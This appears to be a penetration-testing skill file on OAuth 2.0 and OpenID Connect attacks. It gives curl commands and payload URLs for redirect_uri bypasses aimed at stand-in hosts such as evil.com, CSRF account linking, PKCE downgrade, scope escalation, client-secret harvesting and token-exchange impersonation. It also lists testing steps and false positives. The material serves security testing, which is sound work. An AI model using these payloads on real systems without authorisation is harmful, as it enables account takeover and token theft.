---
name: oauth2-attacks
description: OAuth 2.0 and OpenID Connect attack techniques including redirect_uri manipulation, token theft, CSRF, and authorization flow abuse
---

# OAuth 2.0 Attacks

OAuth 2.0 implementation flaws are among the highest-impact web vulnerabilities. Mistakes in redirect_uri validation, state parameter handling, token management, and scope enforcement lead to account takeover, token theft, and privilege escalation.

## Attack Surface

- Authorization endpoints (`/authorize`, `/oauth/authorize`)
- Token endpoints (`/token`, `/oauth/token`)
- Callback/redirect URIs
- Consent screens and scope management
- Social login integrations (Google, Facebook, GitHub, Apple)
- Mobile deep links and custom URI schemes

## Reconnaissance

```bash
# Discover OAuth endpoints
curl -sk "https://TARGET/.well-known/openid-configuration" | python3 -m json.tool
curl -sk "https://TARGET/.well-known/oauth-authorization-server" | python3 -m json.tool
curl -sk "https://TARGET/oauth/authorize" -D - -o /dev/null
curl -sk "https://TARGET/api/oauth/providers" 2>/dev/null

# Extract client_id from page source
curl -sk "https://TARGET/login" | grep -oP 'client_id[=:]["'\'']\K[^"'\''&]+'
curl -sk "https://TARGET/login" | grep -oP 'redirect_uri[=:]["'\'']\K[^"'\''&]+'
```

## Key Vulnerabilities

### Redirect URI Manipulation

```bash
# Open redirect via redirect_uri — steal authorization code/token
# Test exact match bypass techniques:

# Subdomain bypass
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://evil.TARGET/callback

# Path traversal
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback/../../../evil.com

# Fragment bypass
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback%23@evil.com

# Parameter pollution
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback&redirect_uri=https://evil.com

# URL encoding tricks
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback%40evil.com
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback%2F..%2F..%2Fevil.com

# Localhost/internal redirect
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=http://localhost/callback
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=http://127.0.0.1/callback
```

### Missing/Weak State Parameter (CSRF)

```bash
# Check if state parameter is required
curl -sk "https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=code&scope=openid" -D - -o /dev/null

# If state is not validated:
# 1. Attacker initiates OAuth flow, gets authorization code
# 2. Attacker crafts URL: https://TARGET/callback?code=ATTACKER_CODE
# 3. Victim clicks link → account linked to attacker's OAuth identity
```

### Token Leakage via Referer

```bash
# If callback page has external links/resources, token leaks via Referer header
# Implicit flow (response_type=token) puts token in URL fragment
# Fragment is NOT sent via Referer, BUT:

# Upgrade to response_type=token if code is replaced
https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=token

# Check if page loads external resources → token in URL may leak
curl -sk "https://TARGET/callback" | grep -oP 'src="https?://[^"]*"' | grep -v TARGET
```

### Implicit Flow Abuse

```bash
# Implicit flow returns token directly — more attack surface
# Test if implicit flow is enabled when it shouldn't be
curl -sk "https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=token&scope=openid profile email" -D - -o /dev/null | grep -i "location"

# Token substitution — use attacker's token for victim's session
# If the app doesn't validate the token belongs to the current user
```

### PKCE Downgrade

```bash
# Test if server accepts requests without PKCE (code_verifier)
# Step 1: Get auth code WITHOUT code_challenge
curl -sk "https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=code&scope=openid" -D - -o /dev/null

# Step 2: Exchange code WITHOUT code_verifier
curl -sk "https://auth.TARGET/token" -X POST \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=CALLBACK&client_id=CLIENT"
# If token returned without code_verifier → PKCE not enforced
```

### Scope Escalation

```bash
# Request more scopes than originally authorized
curl -sk "https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=code&scope=openid+profile+email+admin" -D - -o /dev/null

# Test scope modification during token exchange
curl -sk "https://auth.TARGET/token" -X POST \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=CALLBACK&client_id=CLIENT&scope=admin"

# Test scope on refresh token
curl -sk "https://auth.TARGET/token" -X POST \
  -d "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&scope=admin+write"
```

### Client Secret Leakage

```bash
# Search for client secrets in JavaScript, source code, mobile apps
curl -sk "https://TARGET/" | grep -oP 'client_secret[=:]["'\'']\K[^"'\''&]+'
curl -sk "https://TARGET/static/main.js" | grep -iE "client.?secret|app.?secret|oauth.?secret"

# Check if secret is required (public vs confidential client)
curl -sk "https://auth.TARGET/token" -X POST \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=CALLBACK&client_id=CLIENT"
# If token returned without client_secret → public client (less secure)
```

## Advanced Techniques

### IdP Mix-Up Attack

```python
# When app supports multiple OAuth providers, trick it into using wrong provider
# Attacker controls their own IdP, intercepts victim's auth flow
# Result: Attacker's token accepted as victim's identity

# Test by replacing provider-specific endpoints in the flow
# E.g., change google.com OAuth endpoint to attacker.com
```

### Token Exchange/Impersonation

```bash
# RFC 8693 Token Exchange — if enabled, could allow impersonation
curl -sk "https://auth.TARGET/token" -X POST \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=VICTIM_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token"
```

## Testing Methodology

1. **Map OAuth flow** — identify provider, client_id, redirect_uri, scopes, response_type
2. **Test redirect_uri** — try subdomain, path traversal, fragment, parameter pollution bypass
3. **Test state parameter** — check if present, validated, and bound to session
4. **Test response_type swap** — try code → token, code → id_token
5. **Test PKCE** — try flow without code_challenge/code_verifier
6. **Test scope escalation** — request additional scopes at each stage
7. **Check token binding** — verify token is bound to user, client, and audience

## Validation

1. Authorization code/token delivered to attacker-controlled redirect_uri
2. CSRF attack links victim's account to attacker's OAuth identity (missing state)
3. Token obtained without PKCE verification
4. Elevated scopes granted without user consent
5. Client secret found in client-side code

## False Positives

- Redirect URI has strict exact-match validation
- State parameter is cryptographically random and session-bound
- PKCE is enforced (S256 required)
- Implicit flow is disabled
- Scopes must be pre-registered and cannot be escalated

## Impact

- **Critical**: Account takeover via redirect_uri manipulation + token theft
- **Critical**: CSRF → account linking to attacker's identity
- **High**: Token theft via Referer leakage
- **High**: Privilege escalation via scope manipulation
- **Medium**: Information disclosure via client secret exposure

## Pro Tips

1. redirect_uri bypass is the highest-impact OAuth attack — spend most time here
2. Test redirect_uri with open redirects on the same domain — `redirect_uri=https://TARGET/open-redirect?url=evil.com`
3. Missing state parameter is extremely common in custom OAuth implementations
4. Mobile apps using custom URI schemes (myapp://) are especially vulnerable to redirect_uri theft
5. Check if authorization codes are single-use — replay the same code multiple times
6. Test token revocation — does the app actually invalidate tokens on logout?
7. GitHub, Google, Facebook OAuth misconfigurations are common — test social login carefully
8. Check for exposed `.well-known/openid-configuration` — it reveals all OAuth endpoints
